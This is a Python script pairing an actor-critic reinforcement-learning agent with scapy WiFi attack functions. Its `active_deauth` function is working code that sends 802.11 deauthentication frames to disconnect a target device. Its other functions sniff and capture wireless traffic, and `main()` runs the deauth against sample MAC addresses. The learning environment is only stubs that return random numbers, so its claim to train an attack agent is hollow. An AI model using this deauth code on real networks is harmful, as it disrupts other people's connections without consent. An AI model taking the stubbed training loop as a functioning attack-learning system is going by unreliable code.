import gym
import torch
import torch.nn as nn
import torch.optim as optim
from scapy.all import *
import numpy as np

# WiFi Environment
class WiFiEnvironment(gym.Env):
    def __init__(self):
        super(WiFiEnvironment, self).__init__()
        # Define action and observation space
        # Actions: 0 - Passive sniffing, 1 - Active deauthentication
        self.action_space = gym.spaces.Discrete(2)
        # Observation space: Simplified for this example (can be expanded)
        self.observation_space = gym.spaces.Box(low=0, high=1, shape=(10,), dtype=np.float32)
        
        self.current_step = 0
        self.max_steps = 1000
        
    def reset(self):
        self.current_step = 0
        return self._get_observation()
    
    def step(self, action):
        self.current_step += 1
        
        if action == 0:
            # Passive sniffing
            observation = self._passive_sniff()
        else:
            # Active deauthentication
            observation = self._active_deauth()
        
        reward = self._calculate_reward(observation)
        done = self.current_step >= self.max_steps
        
        return observation, reward, done, {}
    
    def render(self):
        # Implement visualization if needed
        pass
    
    def _get_observation(self):
        # Simplified observation
        return np.random.rand(10).astype(np.float32)
    
    def _passive_sniff(self):
        # Implement passive sniffing logic
        return self._get_observation()
    
    def _active_deauth(self):
        # Implement active deauthentication logic
        return self._get_observation()
    
    def _calculate_reward(self, observation):
        # Implement reward calculation based on the observation
        return np.sum(observation)

# Actor Network
class Actor(nn.Module):
    def __init__(self, state_dim, action_dim):
        super(Actor, self).__init__()
        self.network = nn.Sequential(
            nn.Linear(state_dim, 64),
            nn.ReLU(),
            nn.Linear(64, 32),
            nn.ReLU(),
            nn.Linear(32, action_dim),
            nn.Softmax(dim=-1)
        )
    
    def forward(self, state):
        return self.network(state)

# Critic Network
class Critic(nn.Module):
    def __init__(self, state_dim):
        super(Critic, self).__init__()
        self.network = nn.Sequential(
            nn.Linear(state_dim, 64),
            nn.ReLU(),
            nn.Linear(64, 32),
            nn.ReLU(),
            nn.Linear(32, 1)
        )
    
    def forward(self, state):
        return self.network(state)

# A2C Agent
class A2CAgent:
    def __init__(self, state_dim, action_dim, lr_actor=0.001, lr_critic=0.005):
        self.actor = Actor(state_dim, action_dim)
        self.critic = Critic(state_dim)
        self.optimizer_actor = optim.Adam(self.actor.parameters(), lr=lr_actor)
        self.optimizer_critic = optim.Adam(self.critic.parameters(), lr=lr_critic)
    
    def train(self, state, action, reward, next_state, done):
        # Convert to tensor
        state = torch.FloatTensor(state)
        next_state = torch.FloatTensor(next_state)
        action = torch.LongTensor([action])
        reward = torch.FloatTensor([reward])
        done = torch.FloatTensor([int(done)])
        
        # Critic update
        value = self.critic(state)
        next_value = self.critic(next_state)
        target = reward + (1 - done) * 0.99 * next_value
        critic_loss = nn.MSELoss()(value, target.detach())
        
        # Actor update
        probs = self.actor(state)
        advantage = (target - value).detach()
        actor_loss = -torch.log(probs[0][action]) * advantage
        
        # Update networks
        self.optimizer_actor.zero_grad()
        self.optimizer_critic.zero_grad()
        actor_loss.backward()
        critic_loss.backward()
        self.optimizer_actor.step()
        self.optimizer_critic.step()
    
    def act(self, state):
        state = torch.FloatTensor(state)
        probs = self.actor(state)
        action = torch.multinomial(probs, 1).item()
        return action

# Utility Functions
def capture_pcap(filename, duration=60):
    """Capture network traffic and save to PCAP file."""
    print(f"Capturing traffic for {duration} seconds...")
    packets = sniff(timeout=duration)
    wrpcap(filename, packets)
    print(f"Captured {len(packets)} packets. Saved to {filename}")

def passive_sniff(interface="wlan0", duration=30):
    """Passive sniffing of WiFi networks."""
    print(f"Sniffing on {interface} for {duration} seconds...")
    packets = sniff(iface=interface, timeout=duration)
    return packets

def active_deauth(target_mac, gateway_mac, count=10, interface="wlan0"):
    """Perform active deauthentication attack."""
    packet = RadioTap() / Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac) / Dot11Deauth()
    print(f"Sending {count} deauth packets to {target_mac}")
    sendp(packet, iface=interface, count=count, inter=0.1, verbose=False)

# Main function
def main():
    env = WiFiEnvironment()
    state_dim = env.observation_space.shape[0]
    action_dim = env.action_space.n
    agent = A2CAgent(state_dim, action_dim)
    
    num_episodes = 1000
    for episode in range(num_episodes):
        state = env.reset()
        done = False
        total_reward = 0
        
        while not done:
            action = agent.act(state)
            next_state, reward, done, _ = env.step(action)
            agent.train(state, action, reward, next_state, done)
            state = next_state
            total_reward += reward
        
        print(f"Episode {episode + 1}, Total Reward: {total_reward}")
    
    # Example usage of utility functions
    capture_pcap("captured_traffic.pcap", duration=30)
    sniffed_packets = passive_sniff(duration=10)
    active_deauth("00:11:22:33:44:55", "AA:BB:CC:DD:EE:FF")

if __name__ == "__main__":
    main()
